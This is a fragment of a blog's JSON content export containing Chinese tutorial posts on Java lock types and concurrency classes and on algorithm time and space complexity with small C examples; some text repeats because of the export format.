title=\"2、ReentrantLock\"></a>2、ReentrantLock</h3><p>ReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。</p>\n<p>ReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。</p>\n<h3 id=\"3、Semaphore-信号量\"><a href=\"#3、Semaphore-信号量\" class=\"headerlink\" title=\"3、Semaphore 信号量\"></a>3、Semaphore 信号量</h3><p>Semaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。</p>\n<p>Semaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。</p>\n<p>此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。</p>\n<p>Semaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。</p>\n<h3 id=\"4、AtomicInteger\"><a href=\"#4、AtomicInteger\" class=\"headerlink\" title=\"4、AtomicInteger\"></a>4、AtomicInteger</h3><p>此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference<v> 将一个对象的所有操作转换为原子操作。</v></p>\n<p>我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。</p>\n<h2 id=\"三、-锁的优化\"><a href=\"#三、-锁的优化\" class=\"headerlink\" title=\"三、 锁的优化\"></a>三、 锁的优化</h2><h3 id=\"1、较少锁持有时间\"><a href=\"#1、较少锁持有时间\" class=\"headerlink\" title=\"1、较少锁持有时间\"></a>1、较少锁持有时间</h3><p>只在有线程安全的程序上加锁</p>\n<h3 id=\"2、减少锁粒度\"><a href=\"#2、减少锁粒度\" class=\"headerlink\" title=\"2、减少锁粒度\"></a>2、减少锁粒度</h3><p>将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。</p>\n<h3 id=\"3、锁分离\"><a href=\"#3、锁分离\" class=\"headerlink\" title=\"3、锁分离\"></a>3、锁分离</h3><p>最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。</p>\n<h3 id=\"4、锁粗化\"><a href=\"#4、锁粗化\" class=\"headerlink\" title=\"4、锁粗化\"></a>4、锁粗化</h3><p>通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。</p>\n<h3 id=\"5、锁消除\"><a href=\"#5、锁消除\" class=\"headerlink\" title=\"5、锁消除\"></a>5、锁消除</h3><p>锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、-Java中锁的分类\"><a href=\"#一、-Java中锁的分类\" class=\"headerlink\" title=\"一、 Java中锁的分类\"></a>一、 Java中锁的分类</h2><h3 id=\"乐观锁\"><a href=\"#乐观锁\" class=\"headerlink\" title=\"乐观锁\"></a>乐观锁</h3><p>乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。</p>\n<p>java中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。</p>\n<h3 id=\"悲观锁\"><a href=\"#悲观锁\" class=\"headerlink\" title=\"悲观锁\"></a>悲观锁</h3><p>悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。</p>\n<h3 id=\"自旋锁\"><a href=\"#自旋锁\" class=\"headerlink\" title=\"自旋锁\"></a>自旋锁</h3><p>自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。</p>\n<p>线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。</p>\n<p>如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。</p>\n<h3 id=\"非公平锁\"><a href=\"#非公平锁\" class=\"headerlink\" title=\"非公平锁\"></a>非公平锁</h3><p>JVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。</p>\n<p>在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。</p>\n<p>对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。</p>\n<h3 id=\"公平锁\"><a href=\"#公平锁\" class=\"headerlink\" title=\"公平锁\"></a>公平锁</h3><p>与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。</p>\n<h3 id=\"可重入锁（递归锁）\"><a href=\"#可重入锁（递归锁）\" class=\"headerlink\" title=\"可重入锁（递归锁）\"></a>可重入锁（递归锁）</h3><p>可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。</p>\n<h3 id=\"ReadWriteLock-读写锁\"><a href=\"#ReadWriteLock-读写锁\" class=\"headerlink\" title=\"ReadWriteLock 读写锁\"></a>ReadWriteLock 读写锁</h3><p>为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。</p>\n<p>Java中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。</p>\n<h3 id=\"共享锁和独占锁\"><a href=\"#共享锁和独占锁\" class=\"headerlink\" title=\"共享锁和独占锁\"></a>共享锁和独占锁</h3><p>java并发包中提供的加锁模式分别为共享锁和独占锁。</p>\n<p><strong>1、独占锁</strong></p>\n<p>独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。</p>\n<p><strong>2、共享锁</strong></p>\n<p>共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。</p>\n<p>AQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。</p>\n<h3 id=\"重量级锁\"><a href=\"#重量级锁\" class=\"headerlink\" title=\"重量级锁\"></a>重量级锁</h3><p>Synchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。</p>\n<h3 id=\"轻量级锁\"><a href=\"#轻量级锁\" class=\"headerlink\" title=\"轻量级锁\"></a>轻量级锁</h3><p>锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。</p>\n<p>随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。</p>\n<p>“轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。</p>\n<h3 id=\"偏向锁\"><a href=\"#偏向锁\" class=\"headerlink\" title=\"偏向锁\"></a>偏向锁</h3><p>Hotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。</p>\n<h3 id=\"分段锁\"><a href=\"#分段锁\" class=\"headerlink\" title=\"分段锁\"></a>分段锁</h3><p>分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。</p>\n<h2 id=\"二、-JAVA中几种锁的实现\"><a href=\"#二、-JAVA中几种锁的实现\" class=\"headerlink\" title=\"二、 JAVA中几种锁的实现\"></a>二、 JAVA中几种锁的实现</h2><h3 id=\"1、Synchronized-同步锁\"><a href=\"#1、Synchronized-同步锁\" class=\"headerlink\" title=\"1、Synchronized 同步锁\"></a>1、Synchronized 同步锁</h3><p>synchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。</p>\n<p><strong>Synchronized的作用范围</strong></p>\n<p>当做用于方法时，锁住的对象是对象的实例（this）。</p>\n<p>当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。</p>\n<p>当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。</p>\n<p><strong>Synchronized 核心组件</strong></p>\n<p>Wait Set： 那些调用wait方法被阻塞的线程放置在这里<br>Contention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中<br>Entry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中<br>OnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeck<br>Owner： 当前已经获取到资源锁的线程被称为Owner<br>!Owner: 当前释放锁的线程</p>\n<h3 id=\"2、ReentrantLock\"><a href=\"#2、ReentrantLock\" class=\"headerlink\" title=\"2、ReentrantLock\"></a>2、ReentrantLock</h3><p>ReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。</p>\n<p>ReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。</p>\n<h3 id=\"3、Semaphore-信号量\"><a href=\"#3、Semaphore-信号量\" class=\"headerlink\" title=\"3、Semaphore 信号量\"></a>3、Semaphore 信号量</h3><p>Semaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。</p>\n<p>Semaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。</p>\n<p>此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。</p>\n<p>Semaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。</p>\n<h3 id=\"4、AtomicInteger\"><a href=\"#4、AtomicInteger\" class=\"headerlink\" title=\"4、AtomicInteger\"></a>4、AtomicInteger</h3><p>此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference<v> 将一个对象的所有操作转换为原子操作。</v></p>\n<p>我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。</p>\n<h2 id=\"三、-锁的优化\"><a href=\"#三、-锁的优化\" class=\"headerlink\" title=\"三、 锁的优化\"></a>三、 锁的优化</h2><h3 id=\"1、较少锁持有时间\"><a href=\"#1、较少锁持有时间\" class=\"headerlink\" title=\"1、较少锁持有时间\"></a>1、较少锁持有时间</h3><p>只在有线程安全的程序上加锁</p>\n<h3 id=\"2、减少锁粒度\"><a href=\"#2、减少锁粒度\" class=\"headerlink\" title=\"2、减少锁粒度\"></a>2、减少锁粒度</h3><p>将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。</p>\n<h3 id=\"3、锁分离\"><a href=\"#3、锁分离\" class=\"headerlink\" title=\"3、锁分离\"></a>3、锁分离</h3><p>最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。</p>\n<h3 id=\"4、锁粗化\"><a href=\"#4、锁粗化\" class=\"headerlink\" title=\"4、锁粗化\"></a>4、锁粗化</h3><p>通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。</p>\n<h3 id=\"5、锁消除\"><a href=\"#5、锁消除\" class=\"headerlink\" title=\"5、锁消除\"></a>5、锁消除</h3><p>锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-复杂度分析","date":"2018-09-07T16:18:36.000Z","mathjax":true,"_content":"\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 为什么需要复杂度分析\n{% endnote %}\n</div>\n\n有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？\n\n- 1、首先，这种评估方法确实是准确的，但是这种方法是\"事后统计法\"，**是有非常大的局限性**。\n\n- 2、**测试结果非常依赖测试环境**，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。\n\n- 3、对于**不同的数据集，如果数据的有序程度不一样**，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，**数据规模的大小**也可能对算法产生影响。\n\n\n因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 大O复杂度表示法\n{% endnote %}\n</div>\n\n算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？\n\n这里举一个简单的例子，求解1，2，3......n 的累加和，以下为一个简单的代码实现：\n\n```C\nint sum(int n){\n  int sum = 0;\n  for (int i=1; i<=n; i++){\n    sum += i;\n  }\n  return sum;\n}\n```\n\n从CPU的角度看，每一行代码都执行着类似的操作：**读数据-运算-写数据**。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算：\n\n第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \\times n \\times time $，所以此段代码执行的时间为$ (2n + 1)\\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。\n\n按照这个思路，再对以下代码段进行分析：\n\n```C\nint sum(int n){\n  int sum = 0;\n  for(int i=1; i <= n; i++){\n    for(int j=1; j <= n; j++){\n      sum += i*j;\n    }\n  }\n}\n```\n\n假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？\n\n第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n\\*time $,内层循环第四、五行代码都执行了$ n\\*n $次,需要的时间为$ 2\\*n^2\\*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)\\*time $。\n\n尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律：\n<div style=\"text-align: center; color: red;\">\n{% cq %} \n所有的代码执行时间T(n)与每行代码的执行次数成正比  \n$$ T(n) = O(f(n)) $$\n{% endcq %}\n</div>\n\n其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。\n\n所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。\n\n在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $;\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 时间复杂度分析\n{% endnote %}\n</div>\n\n前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？\n\n#### 1、只关注循环次数最多的一段代码\n\n在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。\n\n#### 2、加法法则：总复杂度等于量级最大的那段代码的复杂度\n\n如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。\n\n注意：\n当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。\n\n#### 3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\n\n比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) \\* O(n) = O(n^2) $ \n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 几种常见时间复杂度\n{% endnote %}\n</div>\n\n\n#### 1、$O(1)$\n\nO(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。\n\n#### 2、$ O(logN)、O(N\\*logN) $\n\n对数阶的时间复杂度非常常见，同时也是最难分析的一种。\n\n```C\nint i = 1;\nwhile(i <= n){\n  i = i * 2;\n}\n```\n在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8......,所以i的取值规律为 $$ 2^0 \\&nbsp;&nbsp;&nbsp;&nbsp;  2^1 \\&nbsp;&nbsp;  2^2 \\&nbsp;&nbsp; 2^3 ...  2^k... 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\\log_2 N) $。\n\n如果把代码改为如下。那时间复杂度是多少呢？\n\n```C\nint i = 1;\nwhile(i <= n){\n  i = i * 3;\n}\n```\n根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。\n\n实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？\n\n我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32\\*log_2N $，所以$ O(log_32) = O(C \\* log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： **在采用大O标记复杂度的时候，可以忽略系数，即$ O(C\\*f(n)) = O(f(n)) $**。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。\n\n如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。\n\n#### 2、$ O(m+n)、O(m\\*n) $\n\n我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。\n\n```C\nint func(int m, int n){\n  int sum1 = 0;\n  for(int i=1; i<=m; i++){\n    sum1 += i;\n  }\n\n  int sum1 = 0;\n  for(int j=1; j<=m; j++){\n    sum1 += j;\n  }\n  return sum1+sum2;\n}\n```\n\n从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$，\n\n针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) \\* f(n)) $。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 空间复杂度\n{% endnote %}\n</div>\n\n前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。\n\n还是拿具体的例子说明(仅供测试,一般没人这么写)\n\n```C\nvoid func(int n){\n  int i = 0;\n  int[] a = new int[n];\n  for(i; i<n; i++){\n    a[i] = i*1;\n    print(a[i]);\n  }\n}\n```\n\n和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n).\n\n我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。\n\n\n<br>","source":"_posts/算法-复杂度分析.md","raw":"---\ntitle: 算法-复杂度分析\ndate: 2018-09-08 00:18:36\ntags: ['算法','复杂度分析']\ncategories: 算法\nmathjax: true\n---\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 为什么需要复杂度分析\n{% endnote %}\n</div>\n\n有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？\n\n- 1、首先，这种评估方法确实是准确的，但是这种方法是\"事后统计法\"，**是有非常大的局限性**。\n\n- 2、**测试结果非常依赖测试环境**，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。\n\n- 3、对于**不同的数据集，如果数据的有序程度不一样**，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，**数据规模的大小**也可能对算法产生影响。\n\n\n因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 大O复杂度表示法\n{% endnote %}\n</div>\n\n算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？\n\n这里举一个简单的例子，求解1，2，3......n 的累加和，以下为一个简单的代码实现：\n\n```C\nint sum(int n){\n  int sum = 0;\n  for (int i=1; i<=n; i++){\n    sum += i;\n  }\n  return sum;\n}\n```\n\n从CPU的角度看，每一行代码都执行着类似的操作：**读数据-运算-写数据**。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算：\n\n第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \\times n \\times time $，所以此段代码执行的时间为$ (2n + 1)\\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。\n\n按照这个思路，再对以下代码段进行分析：\n\n```C\nint sum(int n){\n  int sum = 0;\n  for(int i=1; i <= n; i++){\n    for(int j=1; j <= n; j++){\n      sum += i*j;\n    }\n  }\n}\n```\n\n假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？\n\n第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n\\*time 